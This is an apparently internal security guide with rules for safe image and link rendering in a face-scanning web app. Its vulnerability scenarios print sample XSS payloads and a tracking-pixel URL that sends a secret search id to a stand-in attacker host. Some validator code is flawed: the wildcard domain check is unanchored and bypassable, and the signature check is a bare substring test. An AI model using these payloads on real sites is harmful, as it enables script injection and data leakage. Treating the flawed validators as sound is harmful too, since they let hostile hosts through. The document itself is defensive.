# Image Safety Rules - Phase 5

## Overview

This document defines the security rules and best practices for rendering images in the Mordeaux Face Scanning application, particularly for query images and search result thumbnails.

**Version**: 1.0  
**Date**: 2025-11-14  
**Status**: Active

---

## Security Principles

### 1. **Defense in Depth**
- Multiple layers of security
- Fail-safe defaults
- Graceful degradation

### 2. **Least Privilege**
- Only allow necessary image sources
- Restrict image capabilities
- Minimize attack surface

### 3. **User Privacy**
- No referrer leakage
- No cross-origin tracking
- Minimal metadata exposure

---

## Image Source Rules

### Rule 1: Presigned URLs Only

**Requirement**: All images MUST use presigned URLs with time-limited access.

**Implementation**:
```typescript
// ✅ GOOD: Presigned URL with expiry and signature
const goodUrl = "https://minio.example.com/thumbnails/tenant123/face-abc_thumb.jpg?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Expires=600&X-Amz-Signature=...";

// ❌ BAD: Direct permanent URL
const badUrl = "https://storage.example.com/images/face-abc.jpg";
```

**Validation**:
```typescript
function isPresignedUrl(url: string): boolean {
  // Check for signature parameters
  return url.includes('X-Amz-Signature') || 
         url.includes('sig=') ||
         url.includes('token=');
}
```

**Rationale**: Presigned URLs provide:
- Time-limited access (prevents long-term exposure)
- Signature verification (prevents tampering)
- Automatic expiry (reduces attack window)

### Rule 2: Whitelisted Domains Only

**Requirement**: Only load images from approved domains.

**Whitelist**:
```typescript
const ALLOWED_IMAGE_DOMAINS = [
  // Production storage
  'minio.mordeaux.com',
  'storage.mordeaux.com',
  's3.amazonaws.com',
  's3-*.amazonaws.com',
  
  // Development/Testing
  'localhost',
  '127.0.0.1',
  'minio.local',
  
  // Placeholder services (dev only)
  'via.placeholder.com',
  'i.pravatar.cc',
  'randomuser.me',
];
```

**Validation**:
```typescript
function isDomainAllowed(url: string): boolean {
  try {
    const { hostname } = new URL(url);
    
    return ALLOWED_IMAGE_DOMAINS.some(allowed => {
      // Exact match
      if (hostname === allowed) return true;
      
      // Wildcard match (e.g., s3-*.amazonaws.com)
      if (allowed.includes('*')) {
        const pattern = allowed.replace('*', '.*');
        return new RegExp(pattern).test(hostname);
      }
      
      return false;
    });
  } catch {
    return false;
  }
}
```

**Rationale**: Whitelist prevents:
- Malicious image sources
- External tracking pixels
- Phishing attacks via images

### Rule 3: HTTPS Only

**Requirement**: Only load images over HTTPS (except localhost).

**Validation**:
```typescript
function isSecureUrl(url: string): boolean {
  try {
    const { protocol, hostname } = new URL(url);
    
    // Allow localhost for development
    if (hostname === 'localhost' || hostname === '127.0.0.1') {
      return true;
    }
    
    // Require HTTPS for all other domains
    return protocol === 'https:';
  } catch {
    return false;
  }
}
```

**Rationale**: HTTPS prevents:
- Man-in-the-middle attacks
- Image content tampering
- Network eavesdropping

---

## Security Headers

### Rule 4: No Referrer Leakage

**Requirement**: Set `referrerPolicy="no-referrer"` on all images.

**Implementation**:
```tsx
<img 
  src={imageUrl}
  referrerPolicy="no-referrer"
  alt="Query face"
/>
```

**Rationale**: Prevents:
- Leaking application state to image servers
- Exposing search IDs in referrer headers
- Cross-site tracking via referrer

**Testing**:
```typescript
// Verify referrer policy is set
const img = document.querySelector('img');
expect(img.referrerPolicy).toBe('no-referrer');
```

### Rule 5: Cross-Origin Isolation

**Requirement**: Set `crossOrigin="anonymous"` for CORS images.

**Implementation**:
```tsx
<img 
  src={imageUrl}
  crossOrigin="anonymous"
  referrerPolicy="no-referrer"
  alt="Query face"
/>
```

**Rationale**: 
- Enables canvas operations (if needed)
- Prevents credential leakage
- Isolates image loading failures

### Rule 6: No Inline Content

**Requirement**: Never use data URIs, blob URLs, or inline SVG for user images.

**Forbidden**:
```tsx
// ❌ BAD: Data URI (can contain executable code)
<img src="data:image/svg+xml,<svg>...</svg>" />

// ❌ BAD: Blob URL (unverified source)
<img src="blob:http://example.com/..." />

// ❌ BAD: srcdoc (executable content)
<iframe srcdoc="<img src='...'>" />
```

**Allowed**:
```tsx
// ✅ GOOD: External presigned URL
<img src="https://minio.example.com/...?sig=..." />
```

**Rationale**: Inline content can contain:
- JavaScript code (XSS attacks)
- Malicious SVG scripts
- Hidden tracking pixels

---

## Link Safety

### Rule 7: Noreferrer Links

**Requirement**: All external links MUST have `rel="noreferrer noopener"`.

**Implementation**:
```tsx
<a 
  href={sourceUrl}
  target="_blank"
  rel="noreferrer noopener"
>
  View Source
</a>
```

**Rationale**:
- `noreferrer`: Prevents referrer leakage
- `noopener`: Prevents `window.opener` access (security)

**Automated Check**:
```typescript
// Lint rule: Require noreferrer on external links
function checkLink(element: HTMLAnchorElement) {
  if (element.target === '_blank') {
    const rel = element.rel;
    if (!rel.includes('noreferrer') || !rel.includes('noopener')) {
      throw new Error('External links must have rel="noreferrer noopener"');
    }
  }
}
```

---

## Fallback & Error Handling

### Rule 8: Always Provide Fallback

**Requirement**: Every image MUST have a fallback placeholder.

**Implementation**:
```tsx
<SafeImage
  src={imageUrl}
  alt="Query face"
  fallback={<FallbackPlaceholder />}
  onError={(error) => logError(error)}
/>
```

**Fallback Hierarchy**:
1. **Primary**: Presigned URL
2. **Retry**: Retry same URL (max 2 attempts)
3. **Fallback**: Static placeholder image
4. **Ultimate**: CSS placeholder with icon

**Rationale**: Ensures:
- UI never breaks due to missing images
- User experience remains consistent
- Errors are visible but non-blocking

### Rule 9: Graceful Degradation

**Requirement**: Image loading failures MUST NOT break the page.

**Implementation**:
```tsx
function SafeImage({ src, alt, fallback }) {
  const [error, setError] = useState(false);
  const [retryCount, setRetryCount] = useState(0);
  
  const handleError = () => {
    if (retryCount < MAX_RETRIES) {
      // Retry
      setRetryCount(retryCount + 1);
      setError(false);
    } else {
      // Show fallback
      setError(true);
    }
  };
  
  if (error) {
    return fallback;
  }
  
  return (
    <img 
      src={`${src}${retryCount > 0 ? `&retry=${retryCount}` : ''}`}
      alt={alt}
      onError={handleError}
      referrerPolicy="no-referrer"
    />
  );
}
```

**Rationale**:
- Network failures are common
- Presigned URLs can expire
- Storage services can be temporarily unavailable

### Rule 10: Retry Policy

**Requirement**: Implement exponential backoff for retries.

**Policy**:
- **Max Retries**: 2
- **Initial Delay**: 1 second
- **Backoff**: 2x (1s, 2s)
- **Timeout**: 10 seconds per attempt

**Implementation**:
```typescript
const RETRY_CONFIG = {
  maxRetries: 2,
  initialDelay: 1000,  // 1 second
  backoffFactor: 2,
  timeout: 10000,      // 10 seconds
};

async function loadImageWithRetry(url: string): Promise<void> {
  let delay = RETRY_CONFIG.initialDelay;
  
  for (let i = 0; i <= RETRY_CONFIG.maxRetries; i++) {
    try {
      await loadImage(url, RETRY_CONFIG.timeout);
      return; // Success
    } catch (error) {
      if (i < RETRY_CONFIG.maxRetries) {
        await sleep(delay);
        delay *= RETRY_CONFIG.backoffFactor;
      } else {
        throw error; // All retries exhausted
      }
    }
  }
}
```

**Rationale**:
- Handles temporary network issues
- Avoids overwhelming servers
- Provides better user experience

---

## Content Security Policy (CSP)

### Rule 11: CSP Headers

**Requirement**: Set appropriate CSP headers for image sources.

**Recommended CSP**:
```http
Content-Security-Policy: 
  img-src 'self' 
    https://minio.mordeaux.com 
    https://storage.mordeaux.com 
    https://*.amazonaws.com;
  default-src 'self';
  script-src 'self';
  style-src 'self' 'unsafe-inline';
```

**Development CSP** (more permissive):
```http
Content-Security-Policy: 
  img-src 'self' 
    http://localhost:* 
    https://via.placeholder.com 
    https://i.pravatar.cc 
    data:;
```

**Implementation** (Vite):
```typescript
// vite.config.ts
export default defineConfig({
  server: {
    headers: {
      'Content-Security-Policy': "img-src 'self' http://localhost:* https://minio.mordeaux.com"
    }
  }
});
```

**Rationale**:
- Prevents XSS via image sources
- Enforces whitelist at HTTP level
- Defense in depth

---

## Size & Performance Limits

### Rule 12: Image Size Limits

**Requirement**: Enforce maximum image dimensions and file size.

**Limits**:
- **Max Width**: 2048px
- **Max Height**: 2048px
- **Max File Size**: 5MB (query images), 1MB (thumbnails)
- **Timeout**: 10 seconds per image load

**Validation**:
```typescript
function validateImageSize(img: HTMLImageElement): boolean {
  const maxWidth = 2048;
  const maxHeight = 2048;
  
  if (img.naturalWidth > maxWidth || img.naturalHeight > maxHeight) {
    console.warn(`Image too large: ${img.naturalWidth}x${img.naturalHeight}`);
    return false;
  }
  
  return true;
}
```

**Rationale**:
- Prevents memory exhaustion
- Improves page performance
- Reduces bandwidth usage

---

## Logging & Monitoring

### Rule 13: Security Event Logging

**Requirement**: Log all security-relevant image events.

**Events to Log**:
- Invalid domain attempts
- Non-HTTPS URL rejections
- Image load failures
- Retry attempts
- CSP violations

**Implementation**:
```typescript
function logImageSecurityEvent(event: SecurityEvent) {
  const logEntry = {
    timestamp: new Date().toISOString(),
    type: event.type,
    url: sanitizeUrl(event.url), // Remove sensitive query params
    error: event.error,
    userAgent: navigator.userAgent,
  };
  
  // Send to logging service
  sendToLogger(logEntry);
}
```

**Example Events**:
```typescript
// Invalid domain
logImageSecurityEvent({
  type: 'INVALID_DOMAIN',
  url: 'https://malicious.com/image.jpg',
  error: 'Domain not in whitelist',
});

// Presigned URL expired
logImageSecurityEvent({
  type: 'URL_EXPIRED',
  url: 'https://minio.example.com/...',
  error: 'Presigned URL expired (403)',
});
```

---

## Testing Requirements

### Rule 14: Security Testing

**Requirement**: Test all security rules before deployment.

**Test Cases**:

1. **Whitelist Enforcement**
   ```typescript
   it('rejects images from non-whitelisted domains', () => {
     const url = 'https://evil.com/image.jpg';
     expect(isDomainAllowed(url)).toBe(false);
   });
   ```

2. **HTTPS Enforcement**
   ```typescript
   it('rejects non-HTTPS URLs', () => {
     const url = 'http://example.com/image.jpg';
     expect(isSecureUrl(url)).toBe(false);
   });
   ```

3. **Referrer Policy**
   ```typescript
   it('sets no-referrer policy', () => {
     render(<SafeImage src={url} />);
     const img = screen.getByRole('img');
     expect(img).toHaveAttribute('referrerPolicy', 'no-referrer');
   });
   ```

4. **Fallback Handling**
   ```typescript
   it('shows fallback on error', async () => {
     render(<SafeImage src="invalid-url" fallback={<div>Fallback</div>} />);
     await waitFor(() => {
       expect(screen.getByText('Fallback')).toBeInTheDocument();
     });
   });
   ```

5. **Retry Logic**
   ```typescript
   it('retries failed loads', async () => {
     const { rerender } = render(<SafeImage src={url} />);
     // Simulate error
     fireEvent.error(screen.getByRole('img'));
     // Should retry
     await waitFor(() => {
       expect(loadAttempts).toBe(2);
     });
   });
   ```

---

## Compliance Checklist

Before deploying any image rendering code, verify:

- [ ] Only presigned URLs or whitelisted domains
- [ ] HTTPS enforced (except localhost)
- [ ] `referrerPolicy="no-referrer"` set
- [ ] `crossOrigin="anonymous"` set (when needed)
- [ ] `rel="noreferrer noopener"` on external links
- [ ] No data URIs or blob URLs for user images
- [ ] Fallback placeholder exists
- [ ] Retry logic implemented
- [ ] Error handling doesn't break UI
- [ ] Security events logged
- [ ] CSP headers configured
- [ ] Size limits enforced
- [ ] Tests pass

---

## Vulnerability Scenarios

### Scenario 1: XSS via Image Source

**Attack**:
```html
<img src="javascript:alert('XSS')" />
```

**Defense**:
- URL validation (rejects non-HTTP(S) protocols)
- CSP `img-src` directive
- React escaping (automatic)

### Scenario 2: Tracking Pixel

**Attack**:
```html
<img src="https://tracker.evil.com/pixel.gif?ref=https://mordeaux.com/search?id=secret" />
```

**Defense**:
- Domain whitelist (rejects tracker.evil.com)
- `referrerPolicy="no-referrer"` (prevents ref parameter)
- Presigned URL requirement (prevents arbitrary parameters)

### Scenario 3: Phishing via Source Link

**Attack**:
```html
<a href="https://phishing.com" target="_blank">
  <img src="https://legitimate.com/image.jpg" />
</a>
```

**Defense**:
- `rel="noreferrer noopener"` (prevents window.opener access)
- Link validation
- User education (external link warnings)

### Scenario 4: SVG Script Injection

**Attack**:
```html
<img src="data:image/svg+xml,<svg onload='alert(1)'>" />
```

**Defense**:
- No data URIs for user images
- CSP blocks inline scripts
- SVG sanitization (if SVGs are allowed)

---

## Quick Reference

### Safe Image Component Usage

```tsx
import SafeImage from './components/SafeImage';

// ✅ GOOD: Presigned URL from API
<SafeImage
  src="https://minio.example.com/...?X-Amz-Signature=..."
  alt="Query face"
  referrerPolicy="no-referrer"
  crossOrigin="anonymous"
/>

// ✅ GOOD: With fallback
<SafeImage
  src={presignedUrl}
  alt="Search result"
  fallback={<PlaceholderIcon />}
  onError={(err) => logError(err)}
/>

// ❌ BAD: Non-whitelisted domain
<img src="https://random-site.com/image.jpg" />

// ❌ BAD: No referrer policy
<img src={presignedUrl} />

// ❌ BAD: Data URI
<img src="data:image/png;base64,..." />
```

### Safe Link Usage

```tsx
// ✅ GOOD: External link with safety
<a 
  href={sourceUrl}
  target="_blank"
  rel="noreferrer noopener"
>
  View Source
</a>

// ❌ BAD: Missing rel attribute
<a href={url} target="_blank">Link</a>
```

---

## Updates & Maintenance

**Last Updated**: 2025-11-14  
**Review Schedule**: Quarterly  
**Next Review**: 2025-02-14

**Change Log**:
- 2025-11-14: Initial version (Phase 5)

**Contact**: Security Team

---

**Document Version**: 1.0  
**Status**: Active  
**Enforcement**: Mandatory for all image rendering

